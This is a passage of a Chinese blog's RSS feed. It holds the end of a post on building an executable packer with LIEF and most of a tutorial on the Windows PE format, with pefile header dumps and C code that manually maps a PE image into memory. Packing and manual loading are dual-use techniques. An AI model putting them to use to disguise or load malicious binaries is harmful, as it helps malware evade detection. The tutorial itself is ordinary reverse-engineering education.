&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">set_property&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">TARGET&lt;/span> &lt;span class="s">packer&lt;/span>
&lt;span class="s">PROPERTY&lt;/span> &lt;span class="s">CXX_STANDARD&lt;/span> &lt;span class="s">11&lt;/span>
&lt;span class="s">PROPERTY&lt;/span> &lt;span class="s">CXX_STANDARD_REQUIRED&lt;/span> &lt;span class="s">ON&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">target_link_libraries&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">packer&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">LIEF_LIBRARIES&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我要顺便一提，LIEF有python包，但那玩意儿不知道为啥赋值content一直报 not supported，没解决。就干脆拿 c++ 写了。论简单快捷还是要看 python 版本的。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>加壳程序反而平平无奇，正印证了那句台下功夫。&lt;/p></description></item><item><title>加壳原理01 - Windows 程序的加载和运行</title><link>https://nnnewb.github.io/blog/p/learning-packer-01/</link><pubDate>Mon, 27 Sep 2021 14:51:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-01/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-01/cover.jpg" alt="Featured image of post 加壳原理01 - Windows 程序的加载和运行" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>本文由多篇相关文章翻译整合得来，参考文章和书目文末给出。&lt;/p>
&lt;h2 id="0x01-pe文件结构">0x01 PE文件结构&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/PE_Format.png"
width="2048"
height="1526"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/PE_Format_hu1d6972d7cbd2497cb5e2be07eb52e9a7_686257_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/PE_Format_hu1d6972d7cbd2497cb5e2be07eb52e9a7_686257_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="PE_Format"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;h3 id="11-从-pe-coff-格式说起">1.1 从 PE-COFF 格式说起&lt;/h3>
&lt;blockquote>
&lt;p>&amp;hellip; 现在PC平台流行的 &lt;strong>可执行文件格式（Executable）&lt;/strong> 主要是 Windows 下的 PE （Portable Executable） 和 Linux 的 ELF （Executable Linkable Format），它们都是 COFF（Common Object File Format）格式的变种。目标文件就是源代码编译后但未进行链接的那些中间文件（Windows 的 .obj 和 Linux 下的 .o），它和可执行文件的内容和结构很相似，所以一般跟可执行文件一起采用一种格式存储。从广义上看，目标文件与可执行文件的格式其实几乎是一样的，所以我们可以广义地将目标文件与可执行文件看成是同一种类型的文件，在 Windows 下，我们可以统称它们为 PE-COFF 文件格式。在 Linux 下，我们可以将它们统称为 ELF 文件。&lt;/p>
&lt;p>&amp;hellip; 不光是 &lt;strong>可执行文件&lt;/strong> （Windows 的 .exe 和 Linux 下的 ELF 可执行文件）按照可执行文件格式存储。&lt;strong>动态链接库（DLL，Dynamic Linking Library）&lt;/strong> （Windows 的 DLL 和 Linux 下的 .so ）以及&lt;strong>静态链接库 （Static Linking Library）&lt;/strong> （Windows 的 .lib 和 Linux 下的 .a）文件都按照可执行文件格式存储。它们在 Windows 下都按照 PE-COFF 格式存储，Linux 下按照 ELF 格式存储。静态链接库稍有不同，它是把很多目标文件捆绑在一起形成一个文件，再加上一些索引，可以简单理解为一个包含很多目标文件的文件包。&lt;/p>
&lt;p>&amp;hellip; COFF 的主要贡献是在目标文件引入了“段”的机制，不同的目标文件可以拥有不同数量及不同类型的“段”。另外，它还定义了调试数据的格式。&lt;/p>
&lt;p>——《程序员的自我修养——链接、装载与库》&lt;/p>
&lt;/blockquote>
&lt;p>这里讨论可执行文件格式，目标文件、静态库、动态库都先暂时不考虑。btw，引文中的“段”其实说的既是Section也是Segment，根据上下文自己理解。&lt;/p>
&lt;h3 id="12-pe-文件头一览">1.2 PE 文件头一览&lt;/h3>
&lt;p>PE格式在 Wiki 上有张挺漂亮的图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/Portable_Executable_32_bit_Structure_in_SVG_fixed.png"
width="2980"
height="4213"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/Portable_Executable_32_bit_Structure_in_SVG_fixed_hu17a376e08455c311f7e43d421ffa5e76_295222_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/Portable_Executable_32_bit_Structure_in_SVG_fixed_hu17a376e08455c311f7e43d421ffa5e76_295222_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Portable_Executable_32_bit_Structure_in_SVG_fixed"
class="gallery-image"
data-flex-grow="70"
data-flex-basis="169px"
>&lt;/p>
&lt;p>图中可以看到，微软的兼容包袱是真的重（不是）。&lt;/p>
&lt;p>PE文件头已经包含了海量的信息，大部分我们不关注（或者说很少关注？），从做个简单壳的目的出发，了解了PE-COFF格式的一点通识和历史后就可以继续了。&lt;/p>
&lt;p>读懂这图需要了解下关于PE文件中几种“地址”的概念：&lt;/p>
&lt;ul>
&lt;li>&lt;em>raw addresses&lt;/em>，或者文件偏移 &lt;em>file offset&lt;/em>，这种地址指的是 &lt;strong>PE 文件中的偏移&lt;/strong>。&lt;/li>
&lt;li>&lt;em>virtual addresses&lt;/em>，虚拟地址，指在 RAM 中的地址，就是一般常说的进程地址空间里的地址。&lt;/li>
&lt;li>&lt;em>relative virtual addresses&lt;/em>，相对镜像基址（Image Base）的虚拟地址，不考虑 ASLR 的情况下，相对地址计算就是基址+RVA。&lt;/li>
&lt;/ul>
&lt;p>可以理解成，VA 就是基址+RVA，RVA就是VA-基址。&lt;/p>
&lt;p>VA/RVA 转文件偏移就麻烦很多，要根据节表 &lt;em>Section Table&lt;/em> 计算。&lt;/p>
&lt;p>上述镜像基址 &lt;em>Image Base&lt;/em> 和节表 &lt;em>Section Table&lt;/em> 都可以在图里找到。&lt;/p>
&lt;h3 id="13-dos-文件头">1.3 DOS 文件头&lt;/h3>
&lt;p>我们可以用在 Python REPL 中用 &lt;a class="link" href="https://pypi.org/project/pefile" target="_blank" rel="noopener"
>pefile&lt;/a> 来快速分析和查看PE文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pefile&lt;/span>
&lt;span class="n">pe&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pefile&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;cm04.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># cm04 是C++写的带界面 Hello world，你也可以用计算器，C:\Windows\System32\calc.exe&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">DOS_HEADERS&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果如下&lt;/p>
&lt;pre>&lt;code>[IMAGE_DOS_HEADER]
0x0 0x0 e_magic: 0x5A4D
0x2 0x2 e_cblp: 0x90
0x4 0x4 e_cp: 0x3
0x6 0x6 e_crlc: 0x0
0x8 0x8 e_cparhdr: 0x4
0xA 0xA e_minalloc: 0x0
0xC 0xC e_maxalloc: 0xFFFF
0xE 0xE e_ss: 0x0
0x10 0x10 e_sp: 0xB8
0x12 0x12 e_csum: 0x0
0x14 0x14 e_ip: 0x0
0x16 0x16 e_cs: 0x0
0x18 0x18 e_lfarlc: 0x40
0x1A 0x1A e_ovno: 0x0
0x1C 0x1C e_res:
0x24 0x24 e_oemid: 0x0
0x26 0x26 e_oeminfo: 0x0
0x28 0x28 e_res2:
0x3C 0x3C e_lfanew: 0x108
&lt;/code>&lt;/pre>&lt;p>第一列是文件偏移，第二列是结构内的相对偏移，第三列是字段名，第四列是值。&lt;/p>
&lt;p>DOS文件头里基本都是为兼容保留的字段，没有我们需要的信息。需要关注的主要是开头的&lt;code>e_magic&lt;/code>，固定为&lt;code>0x5A4D&lt;/code>，也就是ASCII编码的&lt;code>MZ&lt;/code>；还有末尾的&lt;code>e_lfanew&lt;/code>，这个字段保存的是NT文件头的文件偏移，对照上文的图片，就是绿色 COFF Header 开头的 Signature。&lt;/p>
&lt;h3 id="14-ntfilecoff-文件头">1.4 NT/File/COFF 文件头&lt;/h3>
&lt;p>这部分开始，数据结构定义和上文中的PE文件头图有点差异（主要是字段划分归类上），编程的时候按实际数据结构写，看理论的时候遵照文档说法来灵活理解吧。之后C结构定义在字段归类上也有点差别的。总之，参考字段大小顺序，别太在意结构怎么写的。&lt;/p>
&lt;p>用 &lt;code>print(pe.NT_HEADERS)&lt;/code> 可以看到只输出了一个 Signature。剩余的 COFF Header 可以用 &lt;code>pe.FILE_HEADER&lt;/code> 查看（在微软 &lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#file-headers" target="_blank" rel="noopener"
>PE Format 文档&lt;/a>中，Signature 不是 COFF File Header 的组成部分，和 Wiki 的图不一致）。&lt;/p>
&lt;pre>&lt;code>In [4]: print(pe.FILE_HEADER)
[IMAGE_FILE_HEADER]
0x10C 0x0 Machine: 0x14C
0x10E 0x2 NumberOfSections: 0x7
0x110 0x4 TimeDateStamp: 0x61501513 [Sun Sep 26 06:37:07 2021 UTC]
0x114 0x8 PointerToSymbolTable: 0x0
0x118 0xC NumberOfSymbols: 0x0
0x11C 0x10 SizeOfOptionalHeader: 0xE0
0x11E 0x12 Characteristics: 0x102
&lt;/code>&lt;/pre>&lt;p>在这部分文件头中有几个重要字段：&lt;code>NumberOfSections&lt;/code>，PE文件中节的数量；以及 &lt;code>Characteristics&lt;/code>，16比特标志位字段，标识PE文件的一些基本属性。&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics" target="_blank" rel="noopener"
>可用的属性清单链接&lt;/a>。&lt;/p>
&lt;h3 id="15-可选文件头">1.5 可选文件头&lt;/h3>
&lt;p>虽然叫可选文件头（Optional Header），但并不可选。可以照例输出看看。&lt;/p>
&lt;pre>&lt;code>In [5]: print(pe.OPTIONAL_HEADER)
[IMAGE_OPTIONAL_HEADER]
0x120 0x0 Magic: 0x10B
0x122 0x2 MajorLinkerVersion: 0xE
0x123 0x3 MinorLinkerVersion: 0x1D
0x124 0x4 SizeOfCode: 0x6800
0x128 0x8 SizeOfInitializedData: 0xD000
0x12C 0xC SizeOfUninitializedData: 0x0
0x130 0x10 AddressOfEntryPoint: 0x1005
0x134 0x14 BaseOfCode: 0x1000
0x138 0x18 BaseOfData: 0x8000
0x13C 0x1C ImageBase: 0x400000
0x140 0x20 SectionAlignment: 0x1000
0x144 0x24 FileAlignment: 0x200
0x148 0x28 MajorOperatingSystemVersion: 0x6
0x14A 0x2A MinorOperatingSystemVersion: 0x0
0x14C 0x2C MajorImageVersion: 0x0
0x14E 0x2E MinorImageVersion: 0x0
0x150 0x30 MajorSubsystemVersion: 0x6
0x152 0x32 MinorSubsystemVersion: 0x0
0x154 0x34 Reserved1: 0x0
0x158 0x38 SizeOfImage: 0x19000
0x15C 0x3C SizeOfHeaders: 0x400
0x160 0x40 CheckSum: 0x0
0x164 0x44 Subsystem: 0x2
0x166 0x46 DllCharacteristics: 0x8140
0x168 0x48 SizeOfStackReserve: 0x100000
0x16C 0x4C SizeOfStackCommit: 0x1000
0x170 0x50 SizeOfHeapReserve: 0x100000
0x174 0x54 SizeOfHeapCommit: 0x1000
0x178 0x58 LoaderFlags: 0x0
0x17C 0x5C NumberOfRvaAndSizes: 0x10
&lt;/code>&lt;/pre>&lt;p>其中大部分字段要不然是没用到，要不然就是固定值不变。几个值得关注的字段如下。&lt;/p>
&lt;ul>
&lt;li>&lt;code>Magic&lt;/code>，区分 PE32/PE64 格式。微软文档给出的是 &lt;code>0x10b&lt;/code> 对应 &lt;code>PE32&lt;/code>，&lt;code>0x20b&lt;/code> 对应 &lt;code>PE32+&lt;/code>。&lt;/li>
&lt;li>&lt;code>AddressOfEntryPoint&lt;/code>，二进制文件加载后要执行的第一条指令的地址，程序的入口点，&lt;strong>注意是RVA&lt;/strong>。&lt;/li>
&lt;li>&lt;code>ImageBase&lt;/code>，偏好的镜像基址。RVA和这个基址相加得到VA。注意因为ASLR的存在，真实基址在运行前并不确定。&lt;/li>
&lt;li>&lt;code>SizeOfImage&lt;/code>，镜像的 &lt;em>虚拟大小&lt;/em> ，是加载可执行文件到内存时需要申请的内存大小。&lt;/li>
&lt;li>&lt;code>SizeOfHeaders&lt;/code>，所有文件头（DOS、NT、COFF、Optional &amp;hellip;）的总大小。&lt;/li>
&lt;li>&lt;code>DLLCharacteristics&lt;/code>，各种标志位，最有用的是&lt;code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&lt;/code> ，指定镜像基址是否可移动（也就是能不能开启ASLR 基址随机化）。&lt;/li>
&lt;/ul>
&lt;h2 id="0x02-加载pe">0x02 加载PE&lt;/h2>
&lt;p>对PE格式有了基本了解后，就可以开始尝试加载 PE 文件到内存里了。&lt;/p>
&lt;h3 id="21-加载和内存初始化">2.1 加载和内存初始化&lt;/h3>
&lt;p>PE文件头总是加载到镜像基址处。先写一个简单的C程序，把 PE 文件读取。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;winnt.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;missing path argument&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;rb&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;error opening file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Get file size : put pointer at the end
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_END&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// and read its position
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">file_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ftell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// put the pointer back at the beginning
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// allocate memory and read the whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_size&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// read whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">n_read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n_read&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;reading error (%d)&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n_read&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// load the PE in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Loading PE file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>先写这么多，内容只有简单地文件IO，读取PE文件到内存，接下来写一个 &lt;code>void* load_PE(char* PE_data)&lt;/code> 函数，加载PE文件内容到内存空间，返回加载后的镜像基址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// allocate memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_RESERVE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">p_image_base&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>前几句赋值都是在用指针运算取PE文件头里的字段。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
